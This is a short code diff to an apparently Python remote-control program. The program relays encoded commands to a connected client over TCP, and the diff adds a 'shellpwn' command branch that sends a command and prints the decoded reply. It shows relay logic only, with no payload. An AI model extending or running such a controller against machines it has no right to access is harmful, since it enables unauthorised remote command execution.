@@ -5,6 +5,10 @@ import time
 import _thread
 import tcpall
 
+def nop():
+
+	return 0
+
 def ftrans(sck,fname):
 
 	fhandle=open(fname,'rb')
@@ -171,6 +175,12 @@ def passcmd():
             tcpall.send_all(c,str.encode(enc(fname)))
 
             print(tcpall.recv_all(c).decode())
+
+        elif cmd[:8]=="shellpwn":
+
+            tcpall.send_all(c,str.encode(enc(cmd)))
+
+            print(dec(tcpall.recv_all(c).decode()))
 
         elif len(str.encode(cmd))>0:
 
